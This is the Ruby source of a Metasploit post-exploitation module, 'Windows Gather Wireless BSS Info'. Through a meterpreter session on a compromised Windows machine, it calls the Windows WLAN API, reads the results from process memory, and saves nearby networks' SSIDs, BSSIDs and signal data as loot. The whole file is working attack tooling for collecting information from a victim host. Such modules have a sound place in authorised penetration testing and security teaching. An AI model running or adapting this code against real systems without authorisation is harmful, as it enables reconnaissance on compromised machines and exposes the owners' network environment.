##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'
require 'msf/core/auxiliary/report'

class Metasploit3 < Msf::Post
  include Msf::Auxiliary::Report

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Windows Gather Wireless BSS Info',
      'Description'   => %q{
        This module gathers information about the wireless Basic Service Sets
        available to the victim machine.
        },
      'License'       => MSF_LICENSE,
      'Author'        => ['theLightCosine'],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ]
    ))
  end

  def run

    #Opens memory access into the host process
    mypid = client.sys.process.getpid
    @host_process = client.sys.process.open(mypid, PROCESS_ALL_ACCESS)
    @wlanapi = client.railgun.wlanapi

    wlan_connections= "Wireless LAN Active Connections: \n"

    wlan_handle = open_handle()
    unless wlan_handle
      print_error("Couldn't open WlanAPI Handle. WLAN API may not be installed on target")
      print_error("On Windows XP this could also mean the Wireless Zero Configuration Service is turned off")
      return
    end

    wlan_iflist = enum_interfaces(wlan_handle)

    networks = []

    wlan_iflist.each do |interface|
      #Scan with the interface, then wait 10 seconds to give it time to finish
      #If we don't wait we can get unpredicatble results. May be a race condition
      scan_results = @wlanapi.WlanScan(wlan_handle,interface['guid'],nil,nil,nil)
      sleep(10)

      #Grab the list of available Basic Service Sets
      bss_list = wlan_get_networks(wlan_handle,interface['guid'])
      networks << bss_list
    end

    #flatten and uniq the array to try and keep a unique lsit of networks
    networks.flatten!
    networks.uniq!
    network_list= "Available Wireless Networks\n\n"
    networks.each do |network|
      netout = "SSID: #{network['ssid']} \n\tBSSID: #{network['bssid']} \n\tType: #{network['type']}\n\t"
      netout << "PHY: #{network['physical']} \n\tRSSI: #{network['rssi']} \n\tSignal: #{network['signal']}\n"
      print_good(netout)
      network_list << netout
    end

    #strip out any nullbytes for safe loot storage
    network_list.gsub!(/\x00/,"")
    store_loot("host.windows.wlan.networks", "text/plain", session, network_list, "wlan_networks.txt", "Available Wireless LAN Networks")

    #close the Wlan API Handle
    closehandle = @wlanapi.WlanCloseHandle(wlan_handle,nil)
    if closehandle['return'] == 0
      print_status("WlanAPI Handle Closed Successfully")
    else
      print_error("There was an error closing the Handle")
    end
  end


  def open_handle
    begin
      wlhandle = @wlanapi.WlanOpenHandle(2,nil,4,4)
    rescue
      return nil
    end
    return wlhandle['phClientHandle']
  end


  def wlan_get_networks(wlan_handle,guid)

    networks = []

    bss_list = @wlanapi.WlanGetNetworkBssList(wlan_handle,guid,nil,3,true,nil,4)
    pointer = bss_list['ppWlanBssList']
    totalsize = @host_process.memory.read(pointer,4)
    totalsize = totalsize.unpack("V")[0]

    pointer = (pointer + 4)
    numitems = @host_process.memory.read(pointer,4)
    numitems = numitems.unpack("V")[0]

    print_status("Number of Networks: #{numitems}")

    #Iterate through each BSS
    (1..numitems).each do |i|
      bss={}

      #If the length of the SSID is 0 then something is wrong. Skip this one
      pointer = (pointer + 4)
      len_ssid = @host_process.memory.read(pointer,4)
      unless len_ssid.unpack("V")[0]
        next
      end

      #Grabs the ESSID
      pointer = (pointer + 4)
      ssid = @host_process.memory.read(pointer,32)
      bss['ssid'] = ssid.gsub(/\x00/,"")

      #Grab the BSSID/MAC Address of the AP
      pointer = (pointer + 36)
      bssid = @host_process.memory.read(pointer,6)
      bssid = bssid.unpack("H*")[0]
      bssid.insert(2,":")
      bssid.insert(5,":")
      bssid.insert(8,":")
      bssid.insert(11,":")
      bssid.insert(14,":")
      bss['bssid'] = bssid

      #Get the BSS Type
      pointer = (pointer + 8)
      bsstype = @host_process.memory.read(pointer,4)
      bsstype = bsstype.unpack("V")[0]
      case bsstype
        when 1
          bss['type'] = "Infrastructure"
        when 2
          bss['type'] = "Independent"
        when 3
          bss['type'] = "Any"
        else
          bss['type'] = "Unknown BSS Type"
      end

      #Get the Physical Association Type
      pointer = (pointer + 4)
      phy_type = @host_process.memory.read(pointer,4)
      phy_type = phy_type.unpack("V")[0]
      case phy_type
        when 1
          bss['physical'] = "Frequency-hopping spread-spectrum (FHSS)"
        when 2
          bss['physical'] = "Direct sequence spread spectrum (DSSS)"
        when 3
          bss['physical'] = "Infrared (IR) baseband"
        when 4
          bss['physical'] = "Orthogonal frequency division multiplexing (OFDM)"
        when 5
          bss['physical'] = "High-rate DSSS (HRDSSS)"
        when 6
          bss['physical'] = "Extended rate PHY type"
        when 7
          bss['physical'] = "802.11n PHY type"
        else
          bss['physical'] = "Unknown Association Type"
      end

      #Get the Recieved Signal Strength Indicator
      pointer = (pointer + 4)
      rssi = @host_process.memory.read(pointer,4)
      rssi = getle_signed_int(rssi)
      bss['rssi'] = rssi

      #Get the signal strength
      pointer = (pointer + 4)
      signal = @host_process.memory.read(pointer,4)
      bss['signal'] = signal.unpack("V")[0]

      #skip all the rest of the data points as they aren't particularly useful
      pointer = (pointer + 296)

      networks << bss
    end
    return networks
  end

  def enum_interfaces(wlan_handle)

    iflist = @wlanapi.WlanEnumInterfaces(wlan_handle,nil,4)
    pointer= iflist['ppInterfaceList']

    numifs = @host_process.memory.read(pointer,4)
    numifs = numifs.unpack("V")[0]

    interfaces = []

    #Set the pointer ahead to the first element in the array
    pointer = (pointer + 8)
    (1..numifs).each do |i|
      interface = {}
      #Read the GUID (16 bytes)
      interface['guid'] = @host_process.memory.read(pointer,16)
      pointer = (pointer + 16)
      #Read the description(up to 512 bytes)
      interface['description'] = @host_process.memory.read(pointer,512)
      pointer = (pointer + 512)
      #Read the state of the interface (4 bytes)
      state = @host_process.memory.read(pointer,4)
      pointer = (pointer + 4)
      #Turn the state into human readable form
      state = state.unpack("V")[0]
      case state
        when 0
          interface['state'] = "The interface is not ready to operate."
        when 1
          interface['state'] = "The interface is connected to a network."
        when 2
          interface['state'] = "The interface is the first node in an ad hoc network. No peer has connected."
        when 3
          interface['state'] = "The interface is disconnecting from the current network."
        when 4
          interface['state'] = "The interface is not connected to any network."
        when 5
          interface['state'] = "The interface is attempting to associate with a network."
        when 6
          interface['state'] = "Auto configuration is discovering the settings for the network."
        when 7
          interface['state'] = "The interface is in the process of authenticating."
        else
          interface['state'] = "Unknown State"
      end
      interfaces << interface
    end
    return interfaces
  end

  def getle_signed_int(str)
    arr, bits, num = str.unpack('V*'), 0, 0
    arr.each do |int|
      num += int << bits
      bits += 32
    end
    num >= 2**(bits-1) ? num - 2**bits : num
  end

  #Convert the GUID to human readable form
  def guid_to_string(guid)
    aguid = guid.unpack("H*")[0]
    sguid = "{" + aguid[6,2] + aguid[4,2] + aguid[2,2] + aguid[0,2]
    sguid << "-" + aguid[10,2] +  aguid[8,2] + "-" + aguid[14,2] + aguid[12,2] + "-" +  aguid[16,4]
    sguid << "-" + aguid[20,12] + "}"
    return sguid
  end

end
